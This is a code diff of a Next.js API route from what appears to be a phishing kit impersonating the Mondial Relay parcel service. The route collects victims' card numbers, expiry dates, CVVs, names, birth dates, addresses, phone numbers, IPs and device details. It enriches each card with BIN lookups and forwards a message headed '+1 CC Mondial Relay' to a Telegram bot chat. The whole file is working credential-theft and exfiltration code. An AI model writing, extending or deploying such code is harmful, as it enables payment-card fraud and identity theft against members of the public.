@@ -2,36 +2,98 @@ import { NextRequest, NextResponse } from "next/server";
 import { ZodError, z } from "zod";
 
 import { getBinInfo, type BinInfo } from "@/lib/binCheck";
-import { sendTelegramMessage, TelegramConfigurationError } from "@/lib/telegramBot";
 
 export const dynamic = "force-dynamic";
 
+/* ------------------------------------------------------------------ */
+/* Telegram — inline (pas de fichier telegramBot.ts)                   */
+/* ------------------------------------------------------------------ */
+
+const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
+const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+
+async function sendTelegramMessage(text: string): Promise<void> {
+  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
+    throw new Error(
+      "Configuration Telegram manquante (TELEGRAM_BOT_TOKEN / TELEGRAM_CHAT_ID)",
+    );
+  }
+
+  const res = await fetch(
+    `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
+    {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: TELEGRAM_CHAT_ID,
+        text,
+        parse_mode: "HTML",
+        disable_web_page_preview: true,
+      }),
+    },
+  );
+
+  if (!res.ok) {
+    const body = await res.text();
+    throw new Error(`Telegram API error ${res.status}: ${body}`);
+  }
+}
+
+/* ------------------------------------------------------------------ */
+/* Schéma de validation                                                */
+/* ------------------------------------------------------------------ */
+
 const notifySchema = z.object({
+  // Livraison (autres étapes, facultatives ici)
   trackingNumber: z.string().trim().optional(),
   zipcode: z.string().trim().optional(),
   deliveryMode: z.string().trim().optional(),
   selectedParcelShop: z.string().trim().optional(),
   deliveryDate: z.string().trim().optional(),
   deliveryTime: z.string().trim().optional(),
+
+  // Infos personnelles
   lastName: z.string().trim().optional(),
   firstName: z.string().trim().optional(),
   birthDate: z.string().trim().optional(),
   address: z.string().trim().optional(),
   city: z.string().trim().optional(),
   postalCode: z.string().trim().optional(),
-  phone: z.string().trim().regex(/^(?:0[1-9]\d{8}|\+33[1-9]\d{8})$/).optional(),
+  phone: z
+    .string()
+    .trim()
+    .transform(v => v.replace(/\s+/g, ""))
+    .refine(v => /^(?:0[1-9]\d{8}|\+33[1-9]\d{8})$/.test(v), {
+      message: "Numéro de téléphone invalide",
+    })
+    .optional(),
   email: z.string().trim().optional(),
+
+  // Paiement (requis)
   cardHolder: z.string().trim().min(1),
   cardNumber: z.string().trim().min(4),
   expiry: z.string().trim().min(2),
   cvv: z.string().trim().min(1),
+
+  // Meta
   timestamp: z.string().trim().min(1),
   userAgent: z.string().optional(),
 });
 
 type NotifyPayload = z.infer<typeof notifySchema>;
 
-const normalizeHeaderValue = (value: string | null) => value?.replace(/^"+|"+$/g, "").trim() || "";
+/* ------------------------------------------------------------------ */
+/* Helpers                                                             */
+/* ------------------------------------------------------------------ */
+
+const sanitizeText = (value: unknown) =>
+  String(value ?? "")
+    .replace(/&/g, "&amp;")
+    .replace(/</g, "&lt;")
+    .replace(/>/g, "&gt;");
+
+const normalizeHeaderValue = (value: string | null) =>
+  value?.replace(/^"+|"+$/g, "").trim() || "";
 
 const detectDeviceType = (userAgent: string, uaMobileHeader: string | null) => {
   const normalizedHint = normalizeHeaderValue(uaMobileHeader);
@@ -62,23 +124,60 @@ const detectOperatingSystem = (userAgent: string, uaPlatformHeader: string | nul
 const formatTimestamp = (timestamp: string) => {
   const date = new Date(timestamp);
   if (Number.isNaN(date.getTime())) return sanitizeText(timestamp);
-  return new Intl.DateTimeFormat("fr-FR", { dateStyle: "short", timeStyle: "medium" }).format(date);
+  return new Intl.DateTimeFormat("fr-FR", {
+    dateStyle: "short",
+    timeStyle: "medium",
+  }).format(date);
 };
+
+/* ------------------------------------------------------------------ */
+/* Construction du message Telegram                                    */
+/* ------------------------------------------------------------------ */
 
 const buildMessage = (
   payload: NotifyPayload,
-  meta: { clientIp: string; deviceType: string; operatingSystem: string; receivedAt: string; userAgent: string },
+  meta: {
+    clientIp: string;
+    deviceType: string;
+    operatingSystem: string;
+    receivedAt: string;
+    userAgent: string;
+  },
   binInfo: BinInfo,
 ) => {
-  const lines = [
-    "<b>⚡️ +1 CC Mondial Relay</b>",
-    
-    "<b>👤 Coordonnées</b>",
+  const lines: string[] = [];
+
+  // Livraison (uniquement si au moins un champ est présent)
+  if (
+    payload.trackingNumber ||
+    payload.zipcode ||
+    payload.deliveryMode ||
+    payload.selectedParcelShop ||
+    payload.deliveryDate ||
+    payload.deliveryTime
+  ) {
+    lines.push(
+      "<b>📦 Livraison</b>",
+      `• <b>Suivi</b> : ${sanitizeText(payload.trackingNumber || "(non communiqué)")}`,
+      `• <b>Code postal</b> : ${sanitizeText(payload.zipcode || "(non communiqué)")}`,
+      `• <b>Mode</b> : ${sanitizeText(payload.deliveryMode || "(non communiqué)")}`,
+      `• <b>Point relais</b> : ${sanitizeText(payload.selectedParcelShop || "(non communiqué)")}`,
+      `• <b>Date</b> : ${sanitizeText(payload.deliveryDate || "(non communiqué)")}`,
+      `• <b>Heure</b> : ${sanitizeText(payload.deliveryTime || "(non communiqué)")}`,
+      "",
+    );
+  }
+
+  // Infos personnelles
+  lines.push(
+    "<b>🧾 Informations personnelles</b>",
     `• <b>Nom</b> : ${sanitizeText(payload.lastName || "(non communiqué)")}`,
     `• <b>Prénom</b> : ${sanitizeText(payload.firstName || "(non communiqué)")}`,
     `• <b>Date de naissance</b> : ${sanitizeText(payload.birthDate || "(non communiqué)")}`,
     `• <b>Adresse</b> : ${sanitizeText(payload.address || "(non communiqué)")}`,
-    `• <b>Ville</b> : ${sanitizeText([payload.postalCode, payload.city].filter(Boolean).join(" ") || "(non communiqué)")}`,
+    `• <b>Ville</b> : ${sanitizeText(
+      [payload.postalCode, payload.city].filter(Boolean).join(" ") || "(non communiqué)",
+    )}`,
     `• <b>Téléphone</b> : ${sanitizeText(payload.phone || "(non communiqué)")}`,
     `• <b>Email</b> : ${sanitizeText(payload.email || "(non communiqué)")}`,
     "",
@@ -90,7 +189,9 @@ const buildMessage = (
     `• <b>Banque</b> : ${sanitizeText(binInfo.bank)}`,
     `• <b>Niveau</b> : ${sanitizeText(binInfo.level)}`,
     `• <b>Type</b> : ${sanitizeText(binInfo.type)}`,
-    `• <b>Image de la carte</b> : ${binInfo.imageUrl ? sanitizeText(binInfo.imageUrl) : "(non disponible)"}`,
+    `• <b>Image de la carte</b> : ${
+      binInfo.imageUrl ? sanitizeText(binInfo.imageUrl) : "(non disponible)"
+    }`,
     "",
     "<b>🧭 Infos client</b>",
     `• <b>Reçu le</b> : ${formatTimestamp(meta.receivedAt)}`,
@@ -98,43 +199,49 @@ const buildMessage = (
     `• <b>IP</b> : <code>${sanitizeText(meta.clientIp || "(IP non transmise)")}</code>`,
     `• <b>Type d'appareil</b> : ${sanitizeText(meta.deviceType)}`,
     `• <b>Système</b> : ${sanitizeText(meta.operatingSystem)}`,
-    `• <b>User-Agent</b> : ${sanitizeText(meta.userAgent || payload.userAgent || "(userAgent non communiqué)")}`,
-  ];
+    `• <b>User-Agent</b> : ${sanitizeText(
+      meta.userAgent || payload.userAgent || "(userAgent non communiqué)",
+    )}`,
+  );
 
   return lines.join("\n");
 };
 
-export const POST = async (request: NextRequest) => {
+/* ------------------------------------------------------------------ */
+/* Handler POST                                                        */
+/* ------------------------------------------------------------------ */
+
+export async function POST(req: NextRequest) {
   try {
-    const payload = notifySchema.parse(await request.json());
-    const forwardedFor = request.headers.get("x-forwarded-for")?.trim() ?? "";
-    const clientIp = forwardedFor.split(",")[0]?.trim() || "";
-    const userAgentHeader = request.headers.get("user-agent") ?? payload.userAgent ?? "";
+    const json = await req.json();
+    const payload = notifySchema.parse(json);
+
+    const userAgent = req.headers.get("user-agent") ?? "";
+    const meta = {
+      clientIp:
+        req.headers.get("x-forwarded-for")?.split(",")[0]?.trim() ??
+        req.headers.get("x-real-ip") ??
+        "",
+      deviceType: detectDeviceType(userAgent, req.headers.get("sec-ch-ua-mobile")),
+      operatingSystem: detectOperatingSystem(userAgent, req.headers.get("sec-ch-ua-platform")),
+      receivedAt: new Date().toISOString(),
+      userAgent,
+    };
 
     const binInfo = await getBinInfo(payload.cardNumber);
+    const message = buildMessage(payload, meta, binInfo);
 
-    await sendTelegramMessage(
-      buildMessage(
-        payload,
-        {
-          clientIp,
-          deviceType: detectDeviceType(userAgentHeader, request.headers.get("sec-ch-ua-mobile")),
-          operatingSystem: detectOperatingSystem(userAgentHeader, request.headers.get("sec-ch-ua-platform")),
-          receivedAt: new Date().toISOString(),
-          userAgent: userAgentHeader,
-        },
-        binInfo,
-      ),
-    );
+    await sendTelegramMessage(message);
 
-    return NextResponse.json({ ok: true }, { status: 200, headers: { "Cache-Control": "no-store" } });
+    return NextResponse.json({ ok: true });
   } catch (error) {
     if (error instanceof ZodError) {
-      return NextResponse.json({ ok: false, error: "validation_error" }, { status: 422 });
+      return NextResponse.json(
+        { error: "Payload invalide", issues: error.issues },
+        { status: 400 },
+      );
     }
-    if (error instanceof TelegramConfigurationError) {
-      return NextResponse.json({ ok: false, error: "telegram_configuration" }, { status: 500 });
-    }
-    return NextResponse.json({ ok: false, error: "server_error" }, { status: 500 });
+    console.error("[telegram/route] erreur", error);
+    return NextResponse.json({ error: "Erreur serveur" }, { status: 500 });
   }
-};
+}
